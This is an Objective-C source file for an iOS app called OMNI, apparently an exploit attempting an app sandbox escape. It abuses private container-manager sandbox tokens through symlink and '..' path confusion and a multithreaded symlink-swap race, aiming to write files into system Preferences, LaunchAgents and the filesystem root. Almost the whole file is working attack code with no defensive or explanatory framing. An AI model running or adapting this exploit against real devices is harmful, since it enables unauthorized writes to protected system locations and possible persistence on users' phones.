// OMNI — deterministic symlink/.. path confusion + MCM part symlink race, audio keepalive
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <pthread.h>
#import <string.h>

typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);

static fn_create q_create; static fn_set_u64 q_class,q_part,q_flags; static fn_set_obj q_group;
static fn_get_one q_get; static fn_copy_token q_token; static fn_get_path q_path; static fn_free q_free;
static fn_consume s_consume; static fn_release s_release; static fn_xpc_string xpc_string; static fn_xpc_release xpc_release_fn;
static NSMutableString *gLog; static NSString *gPath; static NSString *gGroup,*gPart,*gValid,*gRoot;
static volatile int gStop=0, gWin=0;
static NSString *gTarget;
static pthread_mutex_t gLock=PTHREAD_MUTEX_INITIALIZER;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    pthread_mutex_lock(&gLock);
    [gLog appendString:s]; [gLog appendString:@"\n"];
    [gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    pthread_mutex_unlock(&gLock);
    NSLog(@"[omni] %@", s);
}
static BOOL loadMCM(void){void*h=dlopen("/usr/lib/system/libsystem_containermanager.dylib",RTLD_NOW|RTLD_LOCAL);if(!h){L(@"dlopen fail %s",dlerror());return NO;}q_create=dlsym(h,"container_query_create");q_class=dlsym(h,"container_query_set_class");q_group=dlsym(h,"container_query_set_group_identifiers");q_part=dlsym(h,"container_query_operation_set_part");q_flags=dlsym(h,"container_query_operation_set_flags");q_get=dlsym(h,"container_query_get_single_result");q_token=dlsym(h,"container_copy_sandbox_token");q_path=dlsym(h,"container_object_get_path");q_free=dlsym(h,"container_query_free");s_consume=dlsym(RTLD_DEFAULT,"sandbox_extension_consume");s_release=dlsym(RTLD_DEFAULT,"sandbox_extension_release");xpc_string=dlsym(RTLD_DEFAULT,"xpc_string_create");xpc_release_fn=dlsym(RTLD_DEFAULT,"xpc_release");L(@"[load] create=%p get=%p tok=%p consume=%p",q_create,q_get,q_token,s_consume);return q_create&&q_get&&q_token&&s_consume;}
static NSString *findGroup(void){NSArray*ids=@[@"group.8e0bc870a21520b9.1",@"group.8e0bc870a21520b9.4",@"group.8e0bc870a21520b9.5",@"group.8e0bc870a21520b9.3",@"group.8e0bc870a21520b9.2"];for(NSString*g in ids){NSURL*u=[[NSFileManager defaultManager]containerURLForSecurityApplicationGroupIdentifier:g];if(u.path.length)return g;}return nil;}
static void swapTo(NSString *target){unlink(gPart.fileSystemRepresentation);int rc=symlink(target.fileSystemRepresentation,gPart.fileSystemRepresentation);if(rc)L(@"[swap] fail %@ rc=%d errno=%d",target,rc,errno);}
static BOOL trywrite(NSString *path){errno=0;int fd=open(path.fileSystemRepresentation,O_CREAT|O_WRONLY|O_TRUNC,0644);if(fd<0)return NO;write(fd,"OMNI",4);close(fd);L(@"[WIN] wrote %@",path);return YES;}
static NSString *gWinPath=nil; static NSString *gWinPath2=nil;
static void checkWins(NSString *tag){ (void)tag; if(gWin)return; if(gWinPath&&trywrite(gWinPath)){gWin=1;return;} if(gWinPath2&&trywrite(gWinPath2)){gWin=1;} }
static int64_t queryPart(int part, NSString **pathOut, void **resOut){void*q=q_create();q_class(q,7);void*x=xpc_string?xpc_string(gGroup.UTF8String):NULL;q_group(q,x);q_part(q,part);q_flags(q,0x8000000000ULL);void*res=q_get(q);const char*p=(res&&q_path)?q_path(res):NULL;char*tok=(res&&q_token)?q_token(res):NULL;int64_t h=(tok&&s_consume)?s_consume(tok):-5;if(pathOut)*pathOut=p?[NSString stringWithUTF8String:p]:nil;if(resOut)*resOut=res;if(tok)free(tok);if(q_free)q_free(q);if(x&&xpc_release_fn)xpc_release_fn(x);return h;}

// ---- racing ----
static void *swapper(void *arg){ (void)arg; NSString*a=[gPart stringByAppendingString:@".a"]; NSString*b=[gPart stringByAppendingString:@".b"]; while(!gStop){ @autoreleasepool{ unlink(a.fileSystemRepresentation); symlink(gTarget.fileSystemRepresentation,a.fileSystemRepresentation); rename(a.fileSystemRepresentation,gPart.fileSystemRepresentation); unlink(b.fileSystemRepresentation); symlink(gValid.fileSystemRepresentation,b.fileSystemRepresentation); rename(b.fileSystemRepresentation,gPart.fileSystemRepresentation); } } return NULL; }
static unsigned long gQueries=0, gTokens=0;
static void *racer(void *arg){ (void)arg; for(int i=0;i<40000 && !gStop;i++){ @autoreleasepool{ void*res=NULL; NSString*p=nil; int64_t h=queryPart(3,&p,&res); __sync_fetch_and_add(&gQueries,1); if(h>=0){ __sync_fetch_and_add(&gTokens,1); checkWins(@"race"); if(gWin){gStop=1;} if(s_release)s_release(h);} if(q_free&&res){} } } return NULL; }

static void runRace(NSString *target, int threads, int seconds){
    gTarget=target; gStop=0; gWin=0;
    swapTo(gValid);
    L(@"[race] start target=%@ threads=%d sec=%d",target,threads,seconds);
    pthread_t sw[2], ra[8];
    pthread_create(&sw[0],NULL,swapper,NULL); pthread_create(&sw[1],NULL,swapper,NULL);
    for(int i=0;i<threads;i++) pthread_create(&ra[i],NULL,racer,NULL);
    for(int i=0;i<seconds;i++){ sleep(1); if(gWin||gStop)break; if(i%10==9)L(@"[race] %@ t=%ds q=%lu tok=%lu",target,i+1,gQueries,gTokens); }
    gStop=1;
    for(int i=0;i<threads;i++) pthread_join(ra[i],NULL);
    pthread_join(sw[0],NULL); pthread_join(sw[1],NULL);
    L(@"[race] stop target=%@ q=%lu tok=%lu win=%d",target,gQueries,gTokens,gWin);
    swapTo(gValid);
}

static void stageTests(void){
    // initial token to write inside gValid
    swapTo(gValid);
    NSString *p=nil; void*res0=NULL; int64_t h0=queryPart(3,&p,&res0);
    L(@"[stage0] init token=%lld path=%@",(long long)h0,p?:@"(null)");
    if(h0<0){ L(@"[stage0] no init token, skip"); return; }
    NSString *esc=[gValid stringByAppendingPathComponent:@"omni_esc"];
    NSString *root=[gValid stringByAppendingPathComponent:@"omni_root"];
    unlink(esc.fileSystemRepresentation); unlink(root.fileSystemRepresentation);
    symlink("/var/mobile/Library/Preferences",esc.fileSystemRepresentation);
    symlink("/",root.fileSystemRepresentation);
    if(s_release)s_release(h0);
    NSArray *targets=@[
        esc,
        [esc stringByAppendingPathComponent:@".."],
        [esc stringByAppendingPathComponent:@"../Preferences"],
        [root stringByAppendingPathComponent:@"tmp"],
        [root stringByAppendingPathComponent:@".."],
        [[gValid stringByAppendingPathComponent:@"omni_esc"] stringByAppendingPathComponent:@"../../../../../var/mobile/Library/Preferences"]
    ];
    for(NSString *t in targets){
        swapTo(t);
        NSString *pp=nil; void*rr=NULL; int64_t h=queryPart(3,&pp,&rr);
        L(@"[stage0] gPart->%@ token=%lld path=%@",t,(long long)h,pp?:@"(null)");
        if(h>=0){ checkWins(@"stage0"); if(s_release)s_release(h); }
        if(gWin)return;
    }
    swapTo(gValid);
}

static void run(void){
    @autoreleasepool {
        L(@"=== omni start uid=%d pid=%d",getuid(),getpid()); gWinPath=[NSString stringWithFormat:@"/var/mobile/Library/Preferences/omni_win_%d",getpid()]; gWinPath2=[NSString stringWithFormat:@"/var/mobile/Library/LaunchAgents/omni_win_%d",getpid()];
        if(!loadMCM())return;
        gGroup=findGroup(); if(!gGroup){L(@"no group");return;}
        gRoot=[[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gGroup].path;
        gPart=[gRoot stringByAppendingPathComponent:@"Library/Caches"];
        gValid=@"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
        NSFileManager *fm=[NSFileManager defaultManager];
        [fm createDirectoryAtPath:[gPart stringByDeletingLastPathComponent] withIntermediateDirectories:YES attributes:nil error:nil];
        [fm removeItemAtPath:gPart error:nil];
        stageTests();
        if(!gWin) runRace(@"/var/mobile/Library/Preferences",4,90);
        if(!gWin) runRace(@"/var/mobile/Library/LaunchAgents",4,90);
        if(!gWin) runRace(@"/",4,60);
        L(@"=== omni done win=%d q=%lu tok=%lu ===",gWin,gQueries,gTokens);
    }
}

@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{
    self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController*vc=[UIViewController new]; vc.view.backgroundColor=UIColor.blackColor;
    UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds]; tv.backgroundColor=UIColor.blackColor; tv.textColor=UIColor.greenColor; tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular]; tv.editable=NO; tv.text=@"OMNI"; [vc.view addSubview:tv];
    self.window.rootViewController=vc; [self.window makeKeyAndVisible];
    [UIApplication sharedApplication].idleTimerDisabled=YES;
    NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)firstObject];
    gPath=[[docs stringByAppendingPathComponent:@"omni.log"]copy]; gLog=[NSMutableString new];
    L(@"=== omni launch ===");
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0),^{run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});
    return YES;
}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
